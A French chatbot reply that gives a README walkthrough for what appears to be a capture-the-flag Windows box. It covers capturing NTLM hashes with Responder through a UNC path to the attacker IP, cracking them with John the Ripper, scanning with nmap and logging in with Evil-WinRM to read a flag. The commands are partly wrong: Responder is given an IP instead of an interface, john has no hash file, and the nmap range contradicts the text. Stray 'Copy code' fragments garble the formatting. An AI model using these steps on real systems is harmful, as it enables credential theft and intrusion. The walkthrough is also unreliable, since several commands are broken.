Bien sûr, voici le README simplifié pour un seul copier-coller :

markdown
Copy code
# Guide d'exploitation avec Responder, John The Ripper et Evil-WinRM

## Task 7 - Utilisation de Responder

Utilisez Responder avec l'interface spécifiée :
```bash
responder -I 10.10.14.92
Dans le navigateur, accédez à :

bash
Copy code
http://domaine.cible\\10.10.14.92/toto
http://domaine.cible : Domaine cible.
\\10.10.14.92 : Adresse IP spécifiée dans Responder.
/toto : Dossier fictif pour recevoir les informations collectées par Responder.
Task 8 - John The Ripper
Utilisez John The Ripper pour cracker des mots de passe :

bash
Copy code
john --wordlist=/usr/share/wordlists/rockyou.txt
Task 9 - Décryptage avec John The Ripper
Utilisez John The Ripper avec une wordlist spécifique pour trouver le mot de passe :

bash
Copy code
john --wordlist=/usr/share/wordlists/rockyou.txt
Résultat : badminbton

Task 10 - Scan Nmap de base
Effectuez un scan Nmap de base et précisez les 6000 premiers scans pour le port 5985 :

bash
Copy code
nmap -p 1-1000 -sV -sC [ip]
Task 11 - Exploitation avec Evil-WinRM
Téléchargez Evil-WinRM.
Connectez-vous à la cible :
bash
Copy code
evil-winrm -i [ip] -u 'admin name' -p 'password de la cible'
Après quelques recherches dans les fichiers divers, le flag est trouvé à :

bash
Copy code
/user/mike/desktop/flag.txt
Note : Assurez-vous d'agir de manière éthique et légale dans toutes les activités de sécurité informatique. Respectez toujours les règles et les politiques en place.

less
Copy code

Copiez-collez simplement ce bloc de texte dans votre fichier README. N'oubliez pas de remplacer `[ip]`, `http://domaine.cible`, et autres éléments spécifiques par vos valeurs réelles.
